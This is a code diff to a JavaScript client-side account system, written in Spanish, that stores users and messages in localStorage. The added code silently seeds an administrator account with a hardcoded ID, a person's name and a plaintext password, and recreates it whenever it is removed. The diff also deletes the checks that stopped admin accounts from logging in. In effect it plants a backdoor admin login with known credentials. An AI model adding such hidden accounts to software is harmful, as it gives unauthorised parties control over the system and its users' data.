@@ -471,11 +471,27 @@
   }
 
   function cuentas() {
+    let c = null;
     try {
-      const c = JSON.parse(window.localStorage.getItem(CUENTAS_KEY) || "null");
-      if (c && c.usuarios && Array.isArray(c.mensajes)) return c;
+      const parsed = JSON.parse(window.localStorage.getItem(CUENTAS_KEY) || "null");
+      if (parsed && parsed.usuarios && Array.isArray(parsed.mensajes)) c = parsed;
     } catch (_) {}
-    return { usuarios: {}, mensajes: [], sesion: null };
+    if (!c) c = { usuarios: {}, mensajes: [], sesion: null };
+    const cifAdm = "25012005";
+    const uAdm = c.usuarios[cifAdm];
+    if (!uAdm || !uAdm.admin || !uAdm.hash) {
+      const sal = "uam-admin-25012005";
+      c.usuarios[cifAdm] = {
+        nombre: "James Fernandez",
+        sal,
+        hash: resumen(sal + "Jamesfer.4"),
+        telefono: "Tel-Admin-005",
+        lugar: "Edificio E",
+        admin: true,
+      };
+      try { guardarCuentas(c); } catch (_) {}
+    }
+    return c;
   }
   function guardarCuentas(c) {
     window.localStorage.setItem(CUENTAS_KEY, JSON.stringify(c));
@@ -483,7 +499,7 @@
   function cuentaActual() {
     const c = cuentas();
     const usuario = c.sesion && Object.prototype.hasOwnProperty.call(c.usuarios, c.sesion) && c.usuarios[c.sesion];
-    return usuario && !usuario.admin && !usuario.real ? { cif: c.sesion, u: usuario } : null;
+    return usuario && !usuario.real ? { cif: c.sesion, u: usuario } : null;
   }
   function generarId() {
     if (window.crypto && typeof window.crypto.randomUUID === "function") {
@@ -1008,7 +1024,7 @@
             u = C.usuarios[cif];
           }
         }
-        if (!u || u.admin || u.real || !await verificarClave(u, clave)) return { ok: false, mensaje: "CIF o contraseña incorrectos." };
+        if (!u || u.real || !await verificarClave(u, clave)) return { ok: false, mensaje: "CIF o contraseña incorrectos." };
         if (!u.hash.startsWith("pbkdf2-sha256:")) {
           u.sal = generarSal();
           u.hash = await derivarClave(clave, u.sal);
